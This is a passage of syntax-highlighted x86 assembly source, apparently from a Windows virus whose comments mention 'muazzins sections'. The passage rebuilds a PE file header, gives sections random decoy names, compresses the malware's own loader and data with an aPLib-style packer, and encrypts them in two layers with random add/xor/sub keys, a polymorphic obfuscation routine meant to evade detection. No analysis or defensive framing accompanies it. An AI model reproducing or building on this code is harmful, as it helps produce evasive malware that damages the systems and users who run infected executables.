   </span><span class="sc1">;  .idata header and fields</span><span class="sc0">
   </span><span class="sc1">;  add muazzins sections (increase), random name</span><span class="sc0">

   </span><span class="sc1">;  alloc fsize * 2</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">fsize</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">call_GlobalAlloc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@001</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">

   </span><span class="sc1">;  copy header and change it</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@011</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">504</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc1">;  choose new first section name</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'EDOC'</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.secnameok</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'doc.'</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">.secnameok</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'t'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'xet.'</span><span class="sc0">

   </span><span class="sc5">.secnameok</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc1">;  let's pack the code...</span><span class="sc0">
   </span><span class="sc1">;  entrypoint --&gt; 400h offset (new file)</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">400h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;  output</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workmem</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_main_loader_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;  where to compress</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0">   </span><span class="sc1">;  where it starts</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_ap_pack</span><span class="sc0">

   </span><span class="sc1">;  returns packed size</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@003</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc0">   </span><span class="sc1">;  alignment</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ajustar_no_file</span><span class="sc0">

   </span><span class="sc1">;  the new section size</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@004</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@003</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">400h</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader2_add</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader2_xor</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader2_sub</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc1">;  encrypt the packed code (first level)</span><span class="sc0">

   </span><span class="sc5">l2_encrypt@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l2_encrypt@001</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc1">;  second encryption level</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">enc_by_first</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  first section header...</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">  </span><span class="sc1">;  point to next section</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_EXECUTE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">

   </span><span class="sc1">;  and now repeat the operation with .data section</span><span class="sc0">
   </span><span class="sc1">;  we've to pack only the "valid bytes" part</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@001</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">)</span><span class="sc5">.NumberOfSections</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">S2_NumberOfSections</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">)</span><span class="sc5">.TimeDateStamp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc4">)</span><span class="sc5">.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">SizeOfImage</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc4">)</span><span class="sc5">.OH_SectionAlignment</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">SectionAlignment</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc4">)</span><span class="sc5">.OH_FileAlignment</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">256</span><span class="sc4">+</span><span class="sc5">IMAGE_FILE_HEADER_SIZE</span><span class="sc4">)</span><span class="sc5">.OH_AddressOfEntryPoint</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">AddressOfEntryPoint</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">400h</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@004</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">workmem</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_fixed_data_s2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_name</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc1">;  output packed data</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_name</span><span class="sc0"> </span><span class="sc1">;  where starts to pack</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_ap_pack</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@005</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">set_file_mem_error</span><span class="sc0">

   </span><span class="sc5">do_file_header2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">FileAlignment</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ajustar_no_file</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@006</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@005</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader2_add2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader2_xor2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_loader2_sub2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">l2_encrypt@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">l2_encrypt@002</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">enc_by_first</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  make header</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'at'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'adr.'</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">opt_2_sec_ok</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'at'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'ads.'</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">opt_2_sec_ok</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'tad.'</span><span class="sc0">

   </span><span class="sc5">opt_2_sec_ok</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualSize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0A6000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_VirtualAddress</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">9000h</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">)</span><span class="sc5">.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">40</span><span class="sc4">)</span><span class="sc5">.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_PointerToRawData</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">GENERIC_EXECUTE</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">

   </span><span class="sc1">; copiar a .idata para l·...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">w_handle@011</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  file in memory</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">604</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;  dword pointing where section starts</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">xadd</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@004</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;  make .idata header</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">m_handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'at'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'adi.'</span><span class="sc0">
